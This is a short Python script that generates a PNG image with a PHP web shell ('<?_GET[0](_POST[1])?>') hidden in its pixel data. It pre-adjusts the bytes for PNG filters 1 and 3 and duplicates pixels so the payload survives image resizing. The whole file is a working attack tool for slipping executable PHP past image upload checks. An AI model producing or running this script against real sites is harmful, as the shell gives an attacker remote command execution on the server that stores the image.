#!/usr/bin/python

# pip install numpy
# pip install imageio

import imageio
import numpy as np


# Payloads containing <?_GET[0](_POST[1])?> :

p1 = [0xa3, 0x9f, 0x67, 0x54, 0x6f, 0x2c, 0x24, 0x15, 0x2b, 0x11, 0x67, 0x12,
	0x54, 0x6f, 0x11, 0x2e, 0x29, 0x15, 0x2b, 0x21, 0x67, 0x22, 0x6b, 0x6f,
	0x5f, 0x53, 0x10, 0x50, 0x51, 0xf4, 0x0c, 0x9c, 0xeb, 0x84, 0xe1, 0xd8,
	0x94, 0x03, 0xf5, 0x2e, 0x97, 0x48, 0x2f, 0x50, 0xe0, 0xd0, 0x02, 0xc9,
	0x01, 0x32, 0xa9, 0x3c, 0x5c, 0xb1, 0x19, 0x6e, 0x6c, 0xb1, 0x0b, 0xe1,
	0xd6, 0x17, 0x1c, 0x8f, 0x1b, 0x14, 0, 0, 0]

p3 = [0xa3, 0x9f, 0x67, 0x54, 0x6f, 0x2c, 0x24, 0x15, 0x2b, 0x11, 0x67, 0x12,
	0x54, 0x6f, 0x11, 0x2e, 0x29, 0x15, 0x2b, 0x21, 0x67, 0x22, 0x6b, 0x6f,
	0x5f, 0x53, 0x10, 0x50, 0x51, 0xf4, 0x0c, 0x9c, 0xeb, 0x84, 0xe1, 0xd8,
	0x94, 0x03, 0xf5, 0x2e, 0x97, 0x48, 0x2f, 0x50, 0xe0, 0xd0, 0x02, 0xc9,
	0x01, 0x32, 0xa9, 0x3c, 0x5c, 0xb1, 0x19, 0x6e, 0x6c, 0xb1, 0x0b, 0xe1,
	0xd6, 0x17, 0x1c, 0x8f, 0x1b, 0x14, 0, 0, 0]

n = len(p1)


# Bypassing PNG filters:
for i in range(n - 3):
	p1[i+3] = (p1[i+3] + p1[i]) % 256  # Filter 1
	p3[i+3] = (p3[i+3] + int(p3[i]/2)) % 256 # Filter 3


# Final payload
p = p1 + p3
n = len(p)


# Creating the PNG file as a black square:
imageio.imwrite('pld.png', np.zeros((110,110,3)))
img = imageio.imread('pld.png')


# Inserting the payload in the image:
for i in range(0,n,3):
	# Payload pixel
	r = p[i]
	g = p[i+1]
	b = p[i+2]
	color = [r,g,b]
	# Replicated to overcome resising
	img[0][int(i/3)*2] = color
	img[0][int(i/3)*2+1] = color
	img[1][int(i/3)*2] = color
	img[1][int(i/3)*2+1] = color

imageio.imwrite('pld.png', img)
